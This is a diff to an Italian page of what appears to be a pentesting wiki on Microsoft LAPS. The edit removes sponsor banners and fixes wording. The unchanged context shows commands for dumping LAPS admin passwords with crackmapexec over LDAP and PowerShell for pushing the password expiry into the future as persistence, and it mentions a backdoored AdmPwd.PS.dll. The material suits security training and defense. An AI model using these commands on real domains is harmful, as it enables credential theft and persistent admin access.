@@ -2,15 +2,12 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>
-
-{% embed url="https://websec.nl/" %}
 
 ## Informazioni di base
 
 Local Administrator Password Solution (LAPS) è uno strumento utilizzato per gestire un sistema in cui le **password degli amministratori**, che sono **uniche, casuali e frequentemente cambiate**, vengono applicate ai computer uniti al dominio. Queste password sono memorizzate in modo sicuro all'interno di Active Directory e sono accessibili solo agli utenti a cui è stato concesso il permesso tramite le Liste di Controllo degli Accessi (ACL). La sicurezza delle trasmissioni delle password dal client al server è garantita dall'uso di **Kerberos versione 5** e **Advanced Encryption Standard (AES)**.
 
-Nagli oggetti computer del dominio, l'implementazione di LAPS comporta l'aggiunta di due nuovi attributi: **`ms-mcs-AdmPwd`** e **`ms-mcs-AdmPwdExpirationTime`**. Questi attributi memorizzano rispettivamente la **password dell'amministratore in chiaro** e **il suo tempo di scadenza**.
+Nella struttura degli oggetti computer del dominio, l'implementazione di LAPS comporta l'aggiunta di due nuovi attributi: **`ms-mcs-AdmPwd`** e **`ms-mcs-AdmPwdExpirationTime`**. Questi attributi memorizzano rispettivamente la **password dell'amministratore in chiaro** e **il suo tempo di scadenza**.
 
 ### Controlla se attivato
 ```bash
@@ -88,7 +85,7 @@ DC01.DOMAIN_NAME.LOCAL      j&gR+A(s976Rf% 12/10/2022 13:24:41
 ```
 ## **Dumping LAPS Passwords With Crackmapexec**
 
-Se non c'è accesso a un powershell, puoi abusare di questo privilegio da remoto tramite LDAP utilizzando
+Se non c'è accesso a PowerShell, puoi abusare di questo privilegio da remoto tramite LDAP utilizzando
 ```
 crackmapexec ldap 10.10.10.10 -u user -p password --kdcHost 10.10.10.10 -M laps
 ```
@@ -106,7 +103,7 @@ Password: 2Z@Ae)7!{9#Cq
 
 ### **Data di Scadenza**
 
-Una volta diventati admin, è possibile **ottenere le password** e **prevenire** che una macchina **aggiorni** la sua **password** **impostando la data di scadenza nel futuro**.
+Una volta diventati amministratori, è possibile **ottenere le password** e **prevenire** che una macchina **aggiorni** la sua **password** **impostando la data di scadenza nel futuro**.
 ```powershell
 # Get expiration time
 Get-DomainObject -Identity computer-21 -Properties ms-mcs-admpwdexpirationtime
@@ -128,8 +125,5 @@ Poi, basta compilare il nuovo `AdmPwd.PS.dll` e caricarlo sulla macchina in `C:\
 
 - [https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/](https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/)
 
-<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>
-
-{% embed url="https://websec.nl/" %}
 
 {{#include ../../banners/hacktricks-training.md}}
